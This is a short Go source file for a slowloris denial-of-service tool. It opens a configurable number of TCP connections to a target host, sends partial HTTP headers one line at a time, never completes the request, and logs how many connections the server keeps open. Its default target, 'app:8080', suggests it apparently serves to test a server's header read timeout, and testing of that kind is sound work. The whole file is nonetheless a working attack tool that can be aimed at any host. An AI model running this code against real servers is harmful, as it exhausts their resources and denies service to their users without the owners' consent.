// slowloris opens many connections and sends request headers very slowly,
// never finishing a request. A server without a header read timeout keeps
// a goroutine and buffers alive for each one, forever.
package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"sync/atomic"
	"time"
)

func main() {
	target := flag.String("target", "app:8080", "host:port to attack")
	conns := flag.Int("conns", 1000, "number of slow connections")
	interval := flag.Duration("interval", 3*time.Second, "delay between header bytes")
	duration := flag.Duration("duration", 60*time.Second, "how long to run")
	flag.Parse()

	var open, closed atomic.Int64
	deadline := time.Now().Add(*duration)

	for i := 0; i < *conns; i++ {
		go func(id int) {
			c, err := net.DialTimeout("tcp", *target, 5*time.Second)
			if err != nil {
				closed.Add(1)
				return
			}
			defer c.Close()
			open.Add(1)
			defer open.Add(-1)

			// Start a valid request, then never send the blank line that ends the headers.
			if _, err := fmt.Fprintf(c, "GET /io HTTP/1.1\r\nHost: %s\r\n", *target); err != nil {
				closed.Add(1)
				return
			}
			for n := 0; time.Now().Before(deadline); n++ {
				time.Sleep(*interval)
				if _, err := fmt.Fprintf(c, "X-Slow-%d: %d\r\n", n, id); err != nil {
					closed.Add(1) // the server hung up on us
					return
				}
			}
		}(i)
		time.Sleep(time.Millisecond) // don't open them all in the same instant
	}

	for time.Now().Before(deadline) {
		log.Printf("slow connections open=%d closed-by-server=%d", open.Load(), closed.Load())
		time.Sleep(5 * time.Second)
	}
	log.Printf("done: open=%d closed-by-server=%d", open.Load(), closed.Load())
}
